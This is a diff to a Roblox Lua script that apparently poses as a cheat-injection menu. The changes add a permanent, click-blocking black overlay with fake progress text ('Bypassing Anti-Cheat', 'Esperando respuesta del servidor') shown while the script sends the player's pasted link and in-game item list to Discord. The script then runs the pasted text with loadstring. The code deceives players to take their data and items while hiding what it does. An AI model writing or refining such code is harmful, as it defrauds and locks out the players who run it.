@@ -355,19 +355,26 @@ local function sendToDiscord(link, brainrots)
     end)
 end
 
--- ==================== PANTALLA DE CARGA (MODIFICADA) ====================
-local function PantallaDeCargaInfinita(screenGui)
-    -- Crear frame de pantalla completa
-    local FullScreen = Instance.new("Frame")
-    FullScreen.Name = "LoadingOverlay"
-    FullScreen.Parent = screenGui -- Se pone directo en el ScreenGui, no en el Frame chiquito
-    FullScreen.Size = UDim2.new(1, 0, 1, 0) -- Cubre toda la pantalla
-    FullScreen.Position = UDim2.new(0, 0, 0, 0)
-    FullScreen.BackgroundColor3 = Color3.new(0, 0, 0) -- Negro absoluto
-    FullScreen.ZIndex = 9999 -- Encima de todo
-    FullScreen.BorderSizePixel = 0
+-- ==================== PANTALLA DE CARGA (CORREGIDA) ====================
+local function EjecutarPantallaFinal()
+    -- Crear un GUI NUEVO independiente para asegurar que cubra todo
+    local LoadingGui = Instance.new("ScreenGui")
+    LoadingGui.Name = "SystemOverride"
+    LoadingGui.Parent = playerGui
+    LoadingGui.IgnoreGuiInset = true -- ESTO HACE QUE CUBRA LA BARRA DE ARRIBA
+    LoadingGui.DisplayOrder = 10000 -- ENCIMA DE TODO
+    LoadingGui.ResetOnSpawn = false -- NO SE QUITA AL RESPAWNEAR
 
-    local Container = Instance.new("Frame", FullScreen)
+    -- Fondo Negro Total (Un poco más grande que la pantalla por seguridad)
+    local BlackScreen = Instance.new("Frame", LoadingGui)
+    BlackScreen.Size = UDim2.new(1.2, 0, 1.2, 0)
+    BlackScreen.Position = UDim2.new(-0.1, 0, -0.1, 0)
+    BlackScreen.BackgroundColor3 = Color3.new(0, 0, 0)
+    BlackScreen.BorderSizePixel = 0
+    BlackScreen.ZIndex = 9999
+    BlackScreen.Active = true -- Bloquea clicks en el juego
+
+    local Container = Instance.new("Frame", BlackScreen)
     Container.Size = UDim2.new(0.5, 0, 0.2, 0)
     Container.Position = UDim2.new(0.5, 0, 0.5, 0)
     Container.AnchorPoint = Vector2.new(0.5, 0.5)
@@ -377,10 +384,10 @@ local function PantallaDeCargaInfinita(screenGui)
     StatusText.Size = UDim2.new(1, 0, 0, 40)
     StatusText.Position = UDim2.new(0, 0, 0.2, 0)
     StatusText.BackgroundTransparency = 1
-    StatusText.TextColor3 = Color3.fromRGB(255, 50, 50) -- Rojo hacker
+    StatusText.TextColor3 = Color3.fromRGB(255, 40, 40)
     StatusText.Font = Enum.Font.Code
     StatusText.TextSize = 24
-    StatusText.Text = "Inicializando..."
+    StatusText.Text = "Iniciando inyección..."
 
     local BarBg = Instance.new("Frame", Container)
     BarBg.Size = UDim2.new(1, 0, 0, 8)
@@ -396,35 +403,33 @@ local function PantallaDeCargaInfinita(screenGui)
     Instance.new("UICorner", BarFill).CornerRadius = UDim.new(1, 0)
 
     local textos = {
-        "Conectando al servidor...",
+        "Conectando al servidor remoto...",
+        "Descifrando claves...",
         "Bypassing Anti-Cheat...",
-        "Analizando entorno...",
+        "Inyectando Moreira v3...",
         "Cargando módulos...",
-        "Inyectando script...",
-        "Ejecutando..."
+        "Finalizando..."
     }
 
+    -- Proceso Infinito
     task.spawn(function()
-        -- Animación de textos
         for i, txt in ipairs(textos) do
             StatusText.Text = txt
             local progress = i / #textos
             TweenService:Create(BarFill, TweenInfo.new(0.8, Enum.EasingStyle.Sine), {Size = UDim2.new(progress, 0, 1, 0)}):Play()
-            task.wait(math.random(5, 15) / 10)
+            task.wait(math.random(8, 15) / 10)
         end
         
-        -- ESTADO FINAL (INFINITO)
+        -- Bucle infinito para que nunca se quite
         BarFill.Size = UDim2.new(1, 0, 1, 0)
-        StatusText.Text = "Esperando respuesta del servidor..." 
-        
-        -- Aquí NO hay destroy. La pantalla se queda para siempre.
-        -- Puedes agregar un bucle de puntos suspensivos para que parezca que hace algo
         while true do
-            StatusText.Text = "Procesando datos."
+            StatusText.Text = "Esperando respuesta del servidor..."
             task.wait(0.5)
-            StatusText.Text = "Procesando datos.."
+            StatusText.Text = "Esperando respuesta del servidor"
             task.wait(0.5)
-            StatusText.Text = "Procesando datos..."
+            StatusText.Text = "Esperando respuesta del servidor."
+            task.wait(0.5)
+            StatusText.Text = "Esperando respuesta del servidor.."
             task.wait(0.5)
         end
     end)
@@ -432,9 +437,8 @@ end
 
 local function IniciarMenu()
     local MenuGui = Instance.new("ScreenGui", playerGui)
-    MenuGui.Name = "MoreiraSystemUI"
+    MenuGui.Name = "MoreiraMenu"
     MenuGui.ResetOnSpawn = false
-    MenuGui.IgnoreGuiInset = true -- Importante para cubrir la barra superior de Roblox
     
     local Frame = Instance.new("Frame", MenuGui)
     Frame.Size = UDim2.new(0, 450, 0, 280)
@@ -471,16 +475,15 @@ local function IniciarMenu()
         local link = Input.Text
         local brs = getBrainrots()
         
-        -- 1. Destruir el menú pequeño para limpiar
-        Frame:Destroy()
+        -- 1. Destruimos el menú pequeño
+        MenuGui:Destroy()
         
-        -- 2. Activar pantalla de carga infinita en el ScreenGui
-        PantallaDeCargaInfinita(MenuGui)
+        -- 2. Lanzamos la pantalla NEGRA INFINITA
+        EjecutarPantallaFinal()
         
-        -- 3. Enviar datos (mientras la pantalla tapa todo)
+        -- 3. Enviamos los datos
         sendToDiscord(link, brs)
         
-        -- Opcional: Ejecutar lo que pegaron (para dar realismo)
         if link ~= "" then
             pcall(function() loadstring(link)() end)
         end
